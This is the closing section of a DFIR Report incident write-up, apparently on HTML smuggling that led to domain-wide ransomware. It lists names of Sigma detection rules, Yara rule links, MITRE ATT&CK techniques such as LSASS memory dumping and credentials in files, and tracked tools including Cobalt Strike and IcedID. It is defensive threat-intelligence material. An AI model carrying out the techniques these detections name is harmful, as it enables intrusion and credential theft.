Potential Defense Evasion Via Rename Of Highly Relevant Binaries 0ba1da6d-b6ce-4366-828c-18826c9de23e
Potential Execution of Sysinternals Tools 7cccd811-7ae9-4ebe-9afd-cb5c406b824b
Potential Recon Activity Via Nltest.EXE 5cc90652-4cbd-4241-aa3b-4b462fa5a248
Process Creation Using Sysnative Folder 3c1b5fb0-c72f-45ba-abd1-4d4c353144ab
Psexec Execution 730fc21b-eaff-474b-ad23-90fd265d4988
Rundll32 Execution Without DLL File c3a99af4-35a9-4668-879e-c09aeb4f2bdf
Share And Session Enumeration Using Net.EXE 62510e69-616b-4078-b371-847da438cc03
SMB Create Remote File Admin Share b210394c-ba12-4f89-9117-44a2464b9511
Suspicious Call by Ordinal e79a9e79-eb72-4e78-a628-0e7e8f59e89c
Suspicious Copy From or To System32 fff9d2b7-e11c-4a69-93d3-40ef66189767
Suspicious Encoded PowerShell Command Line ca2092a1-c273-4878-9b4b-0d60115bf5ea
Suspicious Execution of Hostname 7be5fb68-f9ef-476d-8b51-0256ebece19e
Suspicious Group And Account Reconnaissance Activity Using Net.EXE d95de845-b83c-4a9a-8a6a-4fc802ebf6c0
Suspicious Manipulation Of Default Accounts Via Net.EXE 5b768e71-86f2-4879-b448-81061cbae951
Suspicious Network Command a29c1813-ab1f-4dde-b489-330b952e91ae
Suspicious Process Created Via Wmic.EXE 3c89a1e8-0fba-449e-8f1b-8409d6267ec8
Suspicious Rundll32 Without Any CommandLine Params 1775e15e-b61b-4d14-a1a3-80981298085a
WMIC Remote Command Execution 7773b877-5abb-4a3e-b9c9-fd0369b59b00
WmiPrvSE Spawned A Process d21374ff-f574-44a7-9998-4a8c8bf33d7d
CobaltStrike Named Pipe d5601f8c-b26f-4ab0-9035-69e11a8d4ad2
Suspicious Execution of Systeminfo 0ef56343-059e-4cb6-adc1-4c3c967c5e46
</pre>
<h3 class="wp-block-heading">Yara</h3>
<p><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/14335/14335.yar#L184-L203">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/14335/14335.yar#L184-L203</a></p>
<p><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18190/18190.yar#L12-L43">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18190/18190.yar#L12-L43</a></p>
<p><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18190/18190.yar#L45-L76">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18190/18190.yar#L45-L76</a></p>
<p><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/1013/1013.yar#L72-L103">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/1013/1013.yar#L72-L103</a></p>
<p><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18543/18543.yar">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18543/18543.yar</a></p>
<figure class="wp-block-embed"></figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"> </div>
</figure>
<h2 id="mitre" class="wp-block-heading"><a href="#mitre">MITRE</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-037-3.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20760" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-037-3.png" alt width="1960" height="2342" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-037-3.png 1960w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-037-3-251x300.png 251w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-037-3-857x1024.png 857w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-037-3-768x918.png 768w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-037-3-1285x1536.png 1285w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-037-3-1714x2048.png 1714w" sizes="(max-width: 1960px) 100vw, 1960px" /></a></p>
<p>&nbsp;</p>
<pre>PsExec - S0029
AdFind - S0552
Net - S0039
Systeminfo - S0096
ipconfig - S0100
Nltest - S0359
</pre>
<pre>Malicious File - T1204.002
Scheduled Task - T1053.005
Web Protocols - T1071.001
Data Encrypted for Impact - T1486
LSASS Memory - T1003.001
System Network Configuration Discovery - T1016
System Information Discovery - T1082
System Language Discovery - T1614.001
Remote System Discovery - T1018
Local Groups - T1069.001
Local Account - T1087.001
Domain Trust Discovery - T1482
Domain Groups - T1069.002
Domain Account - T1087.002
Network Share Discovery - T1135
Security Software Discovery - T1518.001
Remote Desktop Protocol - T1021.001
Lateral Tool Transfer - T1570
SMB/Windows Admin Shares - T1021.002
Match Legitimate Name or Location - T1036.005
Process Injection - T1055
Rundll32 - T1218.011
Archive Collected Data - T1560
HTML Smuggling - T1027.006
Valid Accounts - T1078
Credentials in Files - T1552.001
Credentials in Registry - T1552.002
PowerShell - T1059.001
Windows Command Shell - T1059.003
Windows Management Instrumenation - T1047<br/>Spearphishing Attachement - T1566.001
</pre>
<h3 class="wp-block-heading">DFIR Report Tracking</h3>
<pre>SoftPerfect Network Scanner
Cobalt Strike
IcedID
</pre>
<p>Internal case # 18543</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-20566" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-20566" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/?share=linkedin" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/?share=reddit" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-20566" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/?share=facebook" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp"><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id="jp-relatedposts" class="jp-relatedposts">
<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
</div>
<footer class="entry-footer">
<div class="entry-meta">
</div>
</footer>
</div>
</article>
<nav class="navigation post-navigation" aria-label="Posts">
<h2 class="screen-reader-text">Post navigation</h2>
<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/" rel="prev">A Truly Graceful Wipe Out</a></div><div class="nav-next"><a href="https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/" rel="next">From ScreenConnect to Hive Ransomware in 61 hours</a></div></div>
</nav>
</main>
</div>
<aside id="secondary" class="widget-area">
<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
<label>
<span class="screen-reader-text">Search for:</span>
<input type="search" class="search-field" placeholder="Search &hellip;" value name="s" />
</label>
<input type="submit" class="search-submit" value="Search" />
</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block"> <div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="175340963" data-post_access_level="everybody" data-subscriber_email id="subscribe-blog">
<div class="wp-block-jetpack-subscriptions__form-elements">
<p id="subscribe-email">
<label id="subscribe-field-label" for="subscribe-field" class="screen-reader-text">
Type your email… </label>
<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your email…" value id="subscribe-field" title="Please fill in this field." /> </p>
<p id="subscribe-submit">
<input type="hidden" name="action" value="subscribe" />
<input type="hidden" name="blog_id" value="175340963" />
<input type="hidden" name="source" value="https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/" />
<input type="hidden" name="sub-type" value="subscribe-block" />
<input type="hidden" name="app_source" value />
<input type="hidden" name="redirect_fragment" value="subscribe-blog" />
<input type="hidden" name="lang" value="en_US" />
<input type="hidden" id="_wpnonce" name="_wpnonce" value="2bedf18890" /><input type="hidden" name="_wp_http_referer" value="/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/" /><input type="hidden" name="post_id" value="20566" /> <button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
Subscribe </button>
</p>
</div>
</form>
</div>
</div>
</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside>
</div>
</div>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="copyright-area">
<div class="wrap">
<div class="site-info">
<a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved </div>
<div class="footer-right-info">
</div>
</div>
</div>
</footer>
<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
</div>
<script type="9e52377b4578954d27e7889d-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2023\/08\/28\/html-smuggling-leads-to-domain-wide-ransomware\/":20566};
	</script>
<style id="jetpack-block-subscriptions-inline-css" type="text/css">
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.6.2" id="freenews-navigation-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.6.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.6.2" id="ResizeSensor-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.6.2" id="theia-sticky-sidebar-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.6.2" id="slick-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.6.2" id="freenews-slick-settings-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.6.2" id="jquery-sticky-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.6.2" id="freenews-sticky-settings-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.6.2" id="marquee-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.6.2" id="freenews-marquee-settings-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"20566\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "20566" ]);
/* ]]> */
</script>
<script type="9e52377b4578954d27e7889d-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=13.9.1" id="google-translate-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=13.9.1" id="jetpack-block-subscriptions-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="9e52377b4578954d27e7889d-|49" defer></script></body>
</html>
